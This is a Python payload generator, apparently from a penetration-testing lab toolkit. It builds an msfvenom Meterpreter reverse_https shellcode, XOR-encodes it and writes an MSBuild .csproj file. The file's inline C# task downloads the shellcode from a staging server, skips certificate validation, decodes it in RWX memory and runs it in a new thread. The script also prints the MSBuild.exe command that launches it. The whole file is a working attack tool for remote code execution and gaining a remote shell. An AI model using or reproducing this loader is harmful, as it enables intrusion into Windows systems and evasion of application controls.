#!/bin/env python3
from ak import *
import ak
import os
import subprocess

BASE_FILENAME = 'win_msbuild_runner'
MSFVENOM_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
XOR_KEY = b'\x09'
STAGER_URL = "http://192.168.49.65/winmsbuildrunner_s2"

def generate(shellcode):

  template = """
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Net;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {{        
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {{
            string url = "{stager_url}";

            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);            
             
            for (int i = 0; i < shellcode.Length; i++)
            {{
                shellcode[i] = (byte)(((uint)shellcode[i] ^ {xor_key}) & 0xFF);
            }}

              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          }}
        }}
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

""".format(xor_shellcode_hex=shellcode.get_hex_csharp(), stager_url=STAGER_URL, xor_key=shellcode.get_key_csharp())

  ak.write_file(BASE_FILENAME + '.csproj', template)
  ak.write_file(BASE_FILENAME + '.sc', shellcode.get_bytes())

def main():
  shellcode = ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)

  generate(shellcode)

  print("Run with: C:\Windows\Microsoft.NET\Framework\\v4.0.30319\MSBuild.exe "+BASE_FILENAME + ".csproj")
  print("Copy {}.sc to: {}".format(BASE_FILENAME,STAGER_URL))

if __name__ == "__main__":
  main()
